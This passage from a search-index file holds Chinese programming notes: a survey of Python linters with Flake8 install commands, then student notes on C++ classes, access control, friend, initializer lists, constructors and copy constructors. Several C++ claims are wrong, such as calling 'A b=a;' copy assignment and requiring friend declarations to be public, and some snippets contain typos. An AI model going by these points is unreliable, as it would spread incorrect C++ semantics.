Tools","text":"<p>\u5728\u505a\u6df1\u5ea6\u5b66\u4e60\u7684\u4efb\u52a1\uff0c\u5f80\u5f80\u5b9e\u9a8c\u7684\u524d\u6447\u5f88\u957f\uff0c\u6bd4\u5982\u5f53\u8d39\u4e86\u534a\u5929\u529b\u6c14\u628a\u6a21\u578b\u52a0\u8f7d\u5230GPU\u4e0a\u65f6\uff0c\u5b9e\u9a8c\u62a5\u9519\u5728\u4e00\u4e2a\u4f20\u53c2\u9519\u8bef\u6216\u8005\u53d8\u91cf\u540d\u4e66\u5199\u9519\u8bef\u7b49\u95ee\u9898\u4e0a\uff0c\u5c31\u76f8\u5f53\u6d6a\u8d39\u65f6\u95f4\uff0c\u56e0\u6b64\u505a\u5fc5\u8981\u7684\u9759\u6001\u7684\u68c0\u67e5\uff0c\u662f\u63d0\u9ad8\u6548\u7387\u7684\u597d\u65b9\u6848</p> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u6700\u6d41\u884c\u548c\u63a8\u8350\u7684 Python Linter/\u9759\u6001\u5206\u6790\u5de5\u5177\uff0c\u5b83\u4eec\u53ef\u4ee5\u5e2e\u52a9\u4f60\u8fdb\u884c\u57fa\u672c\u7684\u8bed\u6cd5\u68c0\u67e5\uff1a</p> <ol> <li> <p>Flake8</p> <ul> <li>\u7279\u70b9\uff1a \u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u6d41\u884c\u7684\u5de5\u5177\uff0c\u5b83\u5c06\u51e0\u4e2a\u72ec\u7acb\u7684\u5de5\u5177\uff08Pyflakes \u7528\u4e8e\u903b\u8f91\u9519\u8bef\u548c\u7b80\u5355\u7684\u8bed\u6cd5\u9519\u8bef\uff0cpycodestyle \u7528\u4e8e\u68c0\u67e5 PEP 8 \u98ce\u683c\u6307\u5357\uff0cMcCabe \u7528\u4e8e\u5708\u590d\u6742\u5ea6\u68c0\u67e5\uff09\u7ec4\u5408\u5728\u4e00\u8d77\u3002</li> <li>\u4f18\u70b9\uff1a \u914d\u7f6e\u76f8\u5bf9\u7b80\u5355\uff0c\u68c0\u67e5\u901f\u5ea6\u5feb\uff0c\u9002\u7528\u4e8e\u68c0\u67e5\u57fa\u672c\u7684\u8bed\u6cd5\u548c\u98ce\u683c\u3002</li> </ul> </li> <li> <p>Pylint</p> <ul> <li>\u7279\u70b9\uff1a \u529f\u80fd\u975e\u5e38\u5f3a\u5927\u548c\u5168\u9762\uff0c\u9664\u4e86\u8bed\u6cd5\u548c\u98ce\u683c\u68c0\u67e5\u5916\uff0c\u8fd8\u80fd\u53d1\u73b0\u66f4\u591a\u7684\u4ee3\u7801\u201c\u5f02\u5473\u201d\uff08code smells\uff09\u3001\u6f5c\u5728\u7684\u903b\u8f91\u9519\u8bef\uff0c\u5e76\u7ed9\u51fa\u91cd\u6784\u5efa\u8bae\u3002</li> <li>\u4f18\u70b9\uff1a \u68c0\u67e5\u975e\u5e38\u5f7b\u5e95\uff0c\u53ef\u5b9a\u5236\u6027\u9ad8\u3002</li> <li>\u7f3a\u70b9\uff1a \u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\u53ef\u80fd\u4f1a\u6bd4\u8f83\u4e25\u683c\uff08\"pedantic\"\uff09\uff0c\u62a5\u544a\u7684\u8b66\u544a\u8f83\u591a\u3002</li> </ul> </li> <li> <p>Ruff</p> <ul> <li>\u7279\u70b9\uff1a \u4e00\u4e2a\u6781\u5176\u5feb\u901f\u7684 Python Linter \u548c\u4ee3\u7801\u683c\u5f0f\u5316\u5de5\u5177\uff0c\u7528 Rust \u7f16\u5199\u3002\u5b83\u58f0\u79f0\u6bd4 Flake8 \u548c Pylint \u5feb\u5f97\u591a\u3002</li> <li>\u4f18\u70b9\uff1a \u901f\u5ea6\u6781\u5feb\uff0c\u53ef\u4ee5\u66ff\u4ee3\u5f88\u591a\u5176\u4ed6\u5de5\u5177\uff0c\u5e76\u5177\u6709\u5185\u7f6e\u7684\u683c\u5f0f\u5316\u529f\u80fd\u3002</li> </ul> </li> <li> <p>Pyflakes</p> <ul> <li>\u7279\u70b9\uff1a \u4e13\u6ce8\u4e8e\u53d1\u73b0\u903b\u8f91\u9519\u8bef\u548c\u7b80\u5355\u7684\u8bed\u6cd5\u9519\u8bef\uff0c\u4f8b\u5982\u672a\u4f7f\u7528\u7684\u5bfc\u5165\u3001\u672a\u5b9a\u4e49\u7684\u53d8\u91cf\u7b49\u3002</li> <li>\u4f18\u70b9\uff1a \u4e0d\u4f1a\u68c0\u67e5\u4ee3\u7801\u98ce\u683c\uff08\u5982 PEP 8\uff09\uff0c\u56e0\u6b64\u51e0\u4e4e\u4e0d\u4f1a\u6709\u8bef\u62a5\uff08false positives\uff09\uff0c\u901f\u5ea6\u975e\u5e38\u5feb\uff0c\u662f\u68c0\u67e5\u7eaf\u7cb9\u9519\u8bef\u7684\u597d\u9009\u62e9\u3002Flake8 \u5305\u542b\u4e86\u5b83\u3002</li> </ul> </li> </ol>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/python/Static%20Analysis%20Tools/#_1","title":"\u2328\ufe0f \u5982\u4f55\u5728\u4f60\u7684\u5f00\u53d1\u73af\u5883\u4e2d\u4f7f\u7528\u8fd9\u4e9b\u5de5\u5177\uff1f","text":"<p>\u5927\u591a\u6570\u73b0\u4ee3\u7684\u4ee3\u7801\u7f16\u8f91\u5668\uff08\u5982 VS Code, PyCharm \u7b49\uff09\u90fd\u6709\u5185\u7f6e\u7684\u652f\u6301\u6216\u63d2\u4ef6\u6765\u96c6\u6210\u8fd9\u4e9b Linter\u3002\u4e00\u65e6\u96c6\u6210\uff0c\u4f60\u5c31\u80fd\u5728\u7f16\u5199\u4ee3\u7801\u65f6\u5b9e\u65f6\u770b\u5230\u8bed\u6cd5\u9519\u8bef\u548c\u8b66\u544a\uff0c\u8fd9\u6bd4\u5728\u6267\u884c\u524d\u624b\u52a8\u8fd0\u884c\u5de5\u5177\u8981\u9ad8\u6548\u5f97\u591a\u3002</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E5%AE%9E%E7%94%A8%E6%8A%80%E8%83%BD/python/Static%20Analysis%20Tools/#flake8","title":"\u2699\ufe0f \u5982\u4f55\u5b89\u88c5\u548c\u4f7f\u7528\uff08\u4ee5 Flake8 \u4e3a\u4f8b\uff09\uff1a","text":"<p>\u901a\u5e38\u901a\u8fc7 pip \u5b89\u88c5\uff1a</p> <pre><code>pip install flake8\n</code></pre> <p>\u7136\u540e\uff0c\u5728\u547d\u4ee4\u884c\u4e2d\u5bf9\u4f60\u7684\u6587\u4ef6\u6216\u76ee\u5f55\u8fd0\u884c\u68c0\u67e5\uff1a</p> <pre><code>flake8 your_script.py\n</code></pre> <p>\u6216\u8005</p> <pre><code>flake8 your_project_directory\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/","title":"C++ note","text":"<p>C++\u5b66\u4e60\u7b14\u8bb0</p> <p>\u5b66\u4e60\u7fc1\u607a\u8001\u5e08\u7684oop\u548c\u6684\u6684\u5b66\u957f\u7684\u7f51\u8bfe\u4e2d\u5199\u7684\u7b14\u8bb0\uff0c\u53ef\u80fd\u5b58\u5728\u4e00\u5b9a\u7684\u9519\u8bef\u4ee5\u53ca\u548c\u6684\u6684\u7684\u7b14\u8bb0\u91cd\u590d\u7684\u5730\u65b9</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#c","title":"C++ \u7c7b","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_1","title":"\u7c7b\u7684\u58f0\u660e\u4e0e\u5b9a\u4e49","text":"<p>\u7c7b\u58f0\u660e\u4e4b\u540e\uff0c\u53ef\u4ee5\u505a\u4e00\u4e9b\u4e8b\u60c5\uff0c\u4f8b\u5982\u5b9a\u4e49\u6307\u5411\u5b83\u7684\u6307\u9488 \u4f46\u7c7b\u5728\u88ab\u5b9a\u4e49\u4e4b\u524d\uff0c\u90fd\u4e0d\u80fd\u53bb\u5b9a\u4e49\u53d8\u91cf\uff08\u5305\u62ec\u6210\u5458\u53d8\u91cf\uff09\uff0c\u4f5c\u4e3a\u51fd\u6570\u58f0\u660e\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c</p> <pre><code>class X;//\u58f0\u660e\nX* p; //\u53ef\u884c\nX* func(); //\u53ef\u884c\n</code></pre> <p>\u4e0d\u5141\u8bb8\u5728\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u4e2d\u5b9a\u4e49\u8fd9\u4e2a\u7c7b\u7684\u53d8\u91cf\uff0c\u56e0\u4e3a\u6b64\u65f6\u8fd9\u4e2a\u7c7b\u8fd8\u5c5e\u4e8e\u672a\u5b9a\u4e49\u5b8c\u5168\u7684\u7c7b</p> <pre><code>class test{\n test t; //\u62a5\u9519\n}\n</code></pre> <p>\u4ec0\u4e48\u7b97\u662f\u5b8c\u6574\u5b9a\u4e49\u7684\u7c7b\uff0c\u7c7b\u7684\u58f0\u660e\u548c\u5b9a\u4e49</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#encapsulation","title":"encapsulation","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#public-private-protected","title":"public private protected","text":"<p>protected \u610f\u5473\u7740\u53ea\u6709\u81ea\u5df1\u7684\u5b50\u7c7b \u5b50\u5b59\u7c7b\u53ef\u4ee5\u8bbf\u95ee\u7684\u6570\u636e</p> <p>private\u662f\u53ea\u6709\u81ea\u5df1\u53ef\u4ee5\u8bbf\u95ee\u7684\u6570\u636e\u548c\u51fd\u6570 \u5b83\u4eec\u53ea\u6709\u8fd9\u4e2a\u7c7b\u7684\u5176\u4ed6\u6210\u5458\u51fd\u6570\u53ef\u4ee5\u8bbf\u95ee \u53ea\u8981\u662f\u5728\u6210\u5458\u51fd\u6570\u91cc\u9762\uff08\u53c2\u6570\u4e0d\u7b97\u5728\u6210\u5458\u51fd\u6570\u91cc\u9762\uff09\uff0c\u65e0\u8bba\u4ec0\u4e48\u60c5\u51b5\u4e0b\u90fd\u53ef\u4ee5\u505a\u5982\u6b64\u8bbf\u95ee \u4ec5\u5728\u7f16\u8bd1\u662f\u68c0\u67e5 C++\u7684oop\u7279\u6027\u4ec5\u5b58\u5728\u4e8e\u6e90\u4ee3\u7801\u7ea7\u522b\uff0c\u5c01\u88c5\u6027\u5728\u7ecf\u8fc7\u7f16\u8bd1\u5668\u4e4b\u540e\u5c31\u4e0d\u590d\u5b58\u5728\u4e86</p> <pre><code>class A{\nprivate :\n    int a;\npublic :\n    void g(A *q){ this-&gt;a = q-&gt;a};//\u6b64\u5904\u5373\u662f\u5728\u4e00\u4e2a\u7c7b\u7684\u6210\u5458\u51fd\u6570\u91cc\u9762\uff0c\n                      //\u8c03\u7528\u4e86\u4efb\u610f\u4e00\u4e2a\u5bf9\u8c61\u7684\u7684\u79c1\u6709\u6210\u5458\n};\n</code></pre> <p>All data member in the class should be declared by private.</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#friend","title":"friend","text":"<p>\u8bbe\u8ba1\u4e3afriend\u7684\u7c7b \u51fd\u6570 \u6216\u662f\u67d0\u4e2a\u7c7b\u91cc\u7684\u67d0\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u53bb\u8c03\u7528\u8fd9\u4e2a\u7c7b\u7684\u79c1\u6709\u6210\u5458\uff0c\u8fd9\u4e2afriend\u9700\u8981\u88ab\u58f0\u660e\u5728public\u4e2d friend \u662f\u8981\u88ab\u8c03\u7528\u79c1\u6709\u6210\u5458\u7684\u7c7b\u53bb\u8bf4\u660e\u7684</p> <p>Here is an example of friend function to access the private member.</p> <pre><code>class testOfFriend{\nprivate:\n        int x;\npublic:\n    friend void func(const testOfFriend&amp; a);\n}\n\nvoid func(const testOfFriend&amp; a){\n        cout&lt;&lt;a.x&lt;&lt;endl;\n}\n</code></pre> <p>And we provide a more practical example</p> <p>\u4f8b\u5982\u6211\u4eec\u6709\u4e00\u4e2a\u7c7b\u8868\u793a\u77e9\u9635matrix \u90a3\u4e48\u77e9\u9635\u7684\u6570\u4e58\u8fd0\u7b97\u6211\u4eec\u77e5\u9053\uff0c\u5e38\u89c1\u4f1a\u6709intmatrix\u7684\u60c5\u51b5\uff0c\u4e8e\u662f\u6211\u4eec\u9700\u8981\u8fd0\u7b97\u7b26\u91cd\u8f7d\u51fd\u6570\uff0c\u7531\u4e8e\u662fintmatrix\uff0c\u6240\u4ee5\u8be5\u8fd0\u7b97\u7b26\u91cd\u8f7d\u4e0d\u80fd\u4f5c\u4e3amatrix\u7c7b\u7684 \u4e00\u90e8\u5206\u5b58\u5728\uff0c\u800c\u5fc5\u987b\u662f\u4e00\u4e2a\u5168\u5c40\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u5728\u8fd9\u4e2a\u8fd0\u7b97\u7b26\u91cd\u8f7d\u51fd\u6570\u4e2d\uff0c\u6211\u4eec\u53c8\u5fc5\u987b\u8981\u8bbf\u95eematrix\u91cc\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20\uff0c\u4e5f\u5373matrix\u7684\u79c1\u6709\u6210\u5458\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u9009\u62e9 \u5728matrix\u7c7b\u4e2d\uff0c\u5c06\u8fd9\u4e2a\u8fd0\u7b97\u7b26\u91cd\u8f7d\u51fd\u6570\uff0c\u58f0\u660e\u4e3afriend\u3002However we have better way as below, and we should avoid to use friend because it is a bisruption to the encapsulation</p> <pre><code>//\u4f46\u4e8b\u5b9e\u4e0a\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6cd5\u5e94\u8be5\u662f\u8fd9\u6837\u7684\nMatrix operator*(int n,Matrix mat){\n    return mar*n;\n}\n//\u901a\u8fc7\u6362\u58f3\uff0c\u6765\u907f\u514d\u4e86\u53cb\u5143\u7c7b\u578b\u7684\u4f7f\u7528\n</code></pre> <p>Here is a strange to express the friend class to use the private member.</p> <pre><code>//\u6b64\u5904\u7684\u4f8b\u5b50\u5f88\u602a\u5f02\n//\u7279\u522b\u7684 \u4e3a\u4e86\u7f16\u8bd1\u8981\u901a\u8fc7\nclass X;//\u8fd9\u91cc\u662f\u4e3a\u4e86\u5728Y\u4e2d\u5b9a\u4e49\u8be5\u51fd\u6570\u65f6\u4e0d\u62a5\u9519\nclass Y{\npublic:\n    void f(X*);//\u8fd9\u91cc\u662f\u4e3a\u4e86\u5728\u4e0b\u9762X\u4e2d\u52a0\u5165friend\u4e0d\u62a5\u9519\n};\n\nclass X{\nprivate :\n    int i;\npublic :\n    void initial();\n    friend void g(X*,int);//\u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u8c03\u7528X\u91cc\u7684\u79c1\u6709\u6210\u5458\n    friend void Y::f(X*);//Y\u7c7b\u91cc\u9762\u7684\u51fd\u6570\u53ef\u4ee5\u8c03\u7528X\u91cc\u7684\u79c1\u6709\u6210\u5458\n    friend class Z;\n    friend void h();\n};\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#initializer-list","title":"initializer list","text":"<p>\u4e00\u79cd\u5e38\u7528\u7684\u5728\u6784\u9020\u51fd\u6570\u4e2d\u521d\u59cb\u5316\u53d8\u91cf\u7684\u65b9\u6cd5\u3002</p> <pre><code>class point{\nprivate :\n    int a;\n    int b;\npublic :\n    point():a(0),b(0){}\n};\n</code></pre> <p>\u8fd9\u4e2a\u884c\u4e3a\u4f1a\u65e9\u4e8e\u6784\u9020\u51fd\u6570\u91cc\u7684\u5185\u5bb9\u88ab\u6267\u884c \u5f53\u7c7b\u7684\u6210\u5458\u662f\u5bf9\u8c61\u65f6\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u5c31\u6709\u610f\u4e49\u4e86 \u6784\u9020\u51fd\u6570\u91cc\u662f\u8d4b\u503c initializer list\u662f\u521d\u59cb\u5316\uff0c\u8fd9\u662f\u4e00\u79cd\u521d\u59cb\u5316\u5668 \u6784\u9020\u51fd\u6570\u7684\u4f5c\u7528\u5728\u4e8e\u521d\u59cb\u5316\u6240\u6709\u7c7b\u4e2d\u7684\u6210\u5458 \u4f46\u662f\u5b9e\u9645\u4e0a\u5982\u679c\u5728\u6784\u9020\u51fd\u6570\u7684\u5927\u62ec\u53f7\u91cc\u5934\u5199\u7684\u8bdd\u5176\u5b9e\u662f\u521d\u59cb\u5316\u518d\u8d4b\u503c\uff0c\u4e00\u65e6\u6709\u7c7b\u6210\u5458\u662f\u5bf9\u8c61\uff0c\u90a3\u4e48\u5b83\u8981\u4e48\u62e5\u6709\u9ed8\u8ba4\u6784\u9020\u51fd\u6570\uff0c\u8981\u4e48\u5b83\u5728\u521d\u59cb\u5316\u5217\u8868\u91cc\u88ab\u521d\u59cb\u5316\u3002</p> <pre><code>//\u4e00\u4e2a\u5408\u9002\u7684\u4f7f\u7528\u521d\u59cb\u5316\u5217\u8868\u7684\u4f8b\u5b50\nclass User{\nprivate:\n    int id,age,failTimes;\n    char* password;\npublic:\n    User(int id,int age,char* pw):id(id),age(age),failTimes(0),password(copystr(pw)){}\n};\n</code></pre> <p>\u7c7b\u91cc\u7684\u6240\u6709\u6210\u5458\u53d8\u91cf\u90fd\u5e94\u8be5\u7528initializer list\u7684\u521d\u59cb\u5316</p> <p>\u5176\u4e2d\u5982\u679c\u4e00\u4e9b\u6709\u81ea\u5b9a\u4e49\u6784\u9020\u51fd\u6570\u7684\u5bf9\u8c61\u4f5c\u4e3a\u6210\u5458\u53d8\u91cf\u7684\u8bdd\uff0c\u4e0d\u4f7f\u7528initializer list \u5c31\u4f1a\u62a5\u9519\u3002</p> <p>\u4f7f\u7528\u521d\u59cb\u5316\u5217\u8868\u6709\u4e00\u4e9b\u9700\u8981\u6ce8\u610f\u7684\u5185\u5bb9\uff1a \u5982\u679c\u6784\u9020\u51fd\u6570\u7684\u58f0\u660e\u548c\u5b9a\u4e49\u5206\u79bb\u4e86\uff0c\u521d\u59cb\u5316\u5217\u8868\u5e94\u5f53\u7528\u5728\u6784\u9020\u51fd\u6570\u7684\u5b9a\u4e49\u4e0a \u521d\u59cb\u5316\u5217\u8868\u4e0d\u5f71\u54cd\u521d\u59cb\u5316\u987a\u5e8f\uff0c\u6240\u6709\u7684\u6210\u5458\u51fd\u6570\u7684\u521d\u59cb\u5316\u987a\u5e8f\u662f\u5176\u5728\u7c7b\u4e2d\u5b9a\u4e49\u7684\u987a\u5e8f</p> <p>initializer list\u4f7f\u7528\u7684\u5fc5\u8981\u6761\u4ef6\u4e4b\u4e00\u4e3a\u5bf9\u4e8e\u6ca1\u6709default constructor \u7684\u6210\u5458\u53d8\u91cf\uff0c\u5fc5\u9700\u4f9d\u8d56initializer list\u8fdb\u884c\u521d\u59cb\u5316\u3002</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#default-member-initializer","title":"default member initializer","text":"<p>default member initializer</p> <p>C++\u4e2d\u652f\u6301\u5728\u5199\u7c7b\u7684\u5b9a\u4e49\u4e2d\uff0c\u7ed9\u6210\u5458\u53d8\u91cf\u4e00\u4e2a\u9ed8\u8ba4\u7684\u503c</p> <pre><code>class User{\n int failtimes=0;//\u8fd9\u5c31\u662f\u4e00\u4e2adefault member initialzer\n ...\n};\n</code></pre> <p>\u6709\u4e00\u70b9\u9700\u8981\u6ce8\u610f\uff0c\u5982\u679c\u8fd9\u4e2a\u6210\u5458\u53d8\u91cf\u662f\u4e00\u4e2a\u5bf9\u8c61\u7684\u8bdd,c++\u4e0d\u5141\u8bb8\u4ee5Point c(0,0); \uff08\u4e5f\u8bb8\u662f\u56e0\u4e3a\u8fd9\u6837\u592a\u50cf\u51fd\u6570\u4e86\uff1f\uff09\u7684\u5f62\u5f0f\u5bf9\u5176\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c \u5fc5\u987b\u5199\u6210\u8fd9\u4e2a\u6837\u5b50Point c=Point(0,0);</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#special-member-function","title":"special member function","text":"<p>\u5728c++\u7684\u7c7b\u4e2d\u5b58\u5728\u56db\u79cd\u7279\u6b8a\u7684\u6210\u5458\u51fd\u6570\uff0c\u5206\u522b\u662f\u6784\u9020\u51fd\u6570\uff0c\u6790\u6784\u51fd\u6570\uff0c\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u548c\u62f7\u8d1d\u8d4b\u503c\u8fd0\u7b97\u7b26\uff08operator=\uff09 \u5b83\u4eec\u6709\u4e00\u4e2a\u5171\u540c\u7684\u7279\u70b9\u5c31\u662f\u6240\u6709\u7684\u7c7b\u90fd\u6709\u9ed8\u8ba4\u7684\u5185\u7f6e\u7684\u51fd\u6570\u5b58\u5728\uff0c\u53ef\u4ee5\u901a\u8fc7\u663e\u5f0f\u7684\u58f0\u660e\u53bb\u5220\u9664\u6216\u8005\u4f7f\u7528\u8fd9\u4e9bdefault function</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_2","title":"\u6784\u9020\u51fd\u6570\u548c\u6790\u6784\u51fd\u6570","text":"<p>constructor </p> <pre><code>class A{\n   public :\n    A();\n   private :\n    int i;\n};\nA::A(){\n    i=0;\n}\n\n//\u5e26\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\nclass B{\n   public :\n    B(int k);\n   private :\n    int i;\n};\nB::B(int k){\n    i=k;\n}\n\n//\u65e0\u53c2\u6784\u9020\u51fd\u6570\u5bf9\u8c61\u7684\u521b\u5efa\nA a;\n//\u5e26\u53c2\u6570\u6784\u9020\u51fd\u6570\u5bf9\u8c61\u7684\u521b\u5efa\nB b(10);\n</code></pre> <p>\u5bf9\u4e8e\u6784\u9020\u51fd\u6570\u7684\u6b63\u786e\u7406\u89e3\uff1aclassA a=classA(); \u76f8\u5bf9\u4e8efunction\u800c\u8a00\uff0cclassA\uff08\uff09\u8fd9\u6837\u7684\u6784\u9020\u51fd\u6570\u66f4\u52a0\u8d34\u8fd1\u4e8e\u7c7b\u578b\u8f6c\u6362\u7b26\u53f7</p> <p>default constructor \u662f\u6307\u6240\u6709\u7684\u53ef\u4ee5\u65e0\u53c2\u8c03\u7528\u7684\u6784\u9020\u51fd\u6570\uff0c\u5305\u62ec\u7f16\u8bd1\u5668\u7ed9\u7684\u548c\u4f60\u81ea\u5df1\u5199\u7684\u6240\u6709\u6ca1\u6709\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\u4ee5\u53ca\u6709\u6240\u6709\u53c2\u6570\u90fd\u6709\u9ed8\u8ba4\u53c2\u6570\u7684\u51fd\u6570 \u6b64\u79cd\u6784\u9020\u51fd\u6570\u8f83\u4e3a\u7279\u6b8a default constructor\u6bd4\u8f83\u7279\u6b8a\uff0c\u4e00\u822c\u7684\u6784\u9020\u51fd\u6570\u4f7f\u7528\u65f6\u9700\u8981\u6709\u62ec\u53f7\uff0c\u7136\u800cdefault constructor\u5728\u6784\u9020\u5bf9\u8c61\u65f6\u4e0d\u80fd\u52a0\u62ec\u53f7\uff0c\u52a0\u4e86\u62ec\u53f7\u7cfb\u7edf\u4f1a\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a\u51fd\u6570</p> <p>c++\u652f\u6301\u59d4\u6258\u6784\u9020\u51fd\u6570\uff0cdelegating constructor \u8fd9\u662f\u901a\u8fc7\u521d\u59cb\u5316\u5217\u8868\uff0c\u628a\u6784\u9020\u5de5\u4f5c\u59d4\u6258\u7ed9\u53e6\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u7684\u65b9\u5f0f</p> <pre><code>struct C{\n    C(int){puts('a')};\n    C():C(42){puts('b')};//\u8fd9\u4e2a\u51fd\u6570\u88ab\u79f0\u4e3adelegating constructor\n};//\u4e0a\u8ff0\u4e3a\u59d4\u6258\u6784\u9020\u51fd\u6570\u7684\u4f8b\u5b50\n</code></pre> <pre><code>class A;//\u5047\u8bbeA\u7684\u6784\u9020\u51fd\u6570\u6ca1\u6709\u53c2\u6570\nA a();//\u6b64\u5904\u7684a\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u503c\u662fA\u7c7b\u7684\u5bf9\u8c61\nA b;//\u6b64\u5904\u662f\u4e00\u4e2a\u53d8\u91cf\u7684\u6784\u9020\uff0c\u6784\u9020\u4e86\u4e00\u4e2aA\u7c7b\u7684\u5bf9\u8c61\n</code></pre> <p>destructor \u6790\u6784\u51fd\u6570</p> <p>\u6790\u6784\u51fd\u6570\u4e0d\u540c\u4e8e\u6784\u9020\u51fd\u6570\uff0c\u6790\u6784\u51fd\u6570\u5fc5\u7136\u662f\u65e0\u53c2\u51fd\u6570\uff0c\u56e0\u6b64\u4e0d\u5b58\u5728\u91cd\u8f7d\u3002</p> <p>\u6790\u6784\u51fd\u6570\u7684\u8c03\u7528\u662f\u4ece\u4e0b\u81f3\u4e0a\u7684\uff0c\u4e00\u822c\u6765\u8bf4\u665a\u6784\u9020\u7684\u5148\u6790\u6784</p> <pre><code>class Y{\npublic :\n    ~Y();//\u6790\u6784\u51fd\u6570\nprivate :\n    int i;\n};\n//\u5f53\u7a0b\u5e8f\u8fd0\u884c\u5230\u79bb\u5f00\u8fd9\u4e2a\u5bf9\u8c61\u7684\u4f5c\u7528\u57df\u4e4b\u540e \u7cfb\u7edf\u4f1a\u8c03\u7528\u6790\u6784\u51fd\u6570\n</code></pre> <p>For object in function, the destructor will happen at the end of function.</p> <p>However, if the the object in function is a return value. It may not happen at the end of fucntion. It will behave as a temporary variable and will be destructed when the sentence ends.</p> <pre><code>class test{...};\ntest func(){\n    return test();\n}\nint main(){\n    func();\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_3","title":"\u62f7\u8d1d\u6784\u9020\u51fd\u6570","text":"<p>\u5728c++\u4e2d\u8981\u6ce8\u610f\u521d\u59cb\u5316\u548c\u8d4b\u503c\u7684\u533a\u522b</p> <pre><code>class A;//A\u4e2d\u53ea\u6709\u4e00\u822c\u7684\u6784\u9020\u51fd\u6570 \u65e0\u62f7\u8d1d\u6784\u9020\u51fd\u6570\nvoid func(A a);\n\nA a;   //\u6784\u9020\u51fd\u6570\nA b=a; //\u62f7\u8d1d\u8fd0\u7b97\u7b26\u91cd\u8f7d\u51fd\u6570\nA c(a); //\u62f7\u8d1d\u6784\u9020\u51fd\u6570\nfunc(a); //\u62f7\u8d1d\u6784\u9020\u51fd\u6570\n</code></pre> <p>\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e4b\u4e2d b\u7684\u521d\u59cb\u5316\u6ca1\u6709\u7ecf\u8fc7A\u7c7b\u7684\u6784\u9020\u51fd\u6570 \u800c\u662f\u76f4\u63a5\u7531a\u8d4b\u503c\u8fc7\u6765 \u540c\u6837\u7684 \u5f53\u4e00\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u51fd\u6570\u7684\u53c2\u6570 \u7136\u540e\u5b9e\u53c2\u4f20\u5165\u51fd\u6570\u4e2d\u65f6 \u4e5f\u662f\u4f5c\u4e3a\u8d4b\u503c\u800c\u8df3\u8fc7\u4e00\u822c\u7684\u6784\u9020\u51fd\u6570</p> <p>\u9488\u5bf9\u6b64\u79cd\u95ee\u9898 \u6211\u4eec\u6709\u62f7\u8d1d\u6784\u9020\u51fd\u6570 **\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u5b9a\u4e49 **</p> <p>\u5b83\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u5e76\u4e14\u7b2c\u4e00\u4e2a\u53d8\u91cf\u4e3a\u8be5\u7c7b\u7684\u5f15\u7528\uff0c\u53ef\u4ee5\u4e3a\u5e38\u91cf\u5f15\u7528\u4e5f\u53ef\u4ee5\u662f\u975e\u5e38\u91cf\u5f15\u7528\uff0c\u6ca1\u6709\u5176\u4ed6\u53d8\u91cf\u6216\u8005\u5176\u4ed6\u53d8\u91cf\u90fd\u6709default value \u5f62\u5982 T::T(const T&amp; )   tips\uff1a\u56e0\u4e3a\u5982\u679c\u662fT::T(T 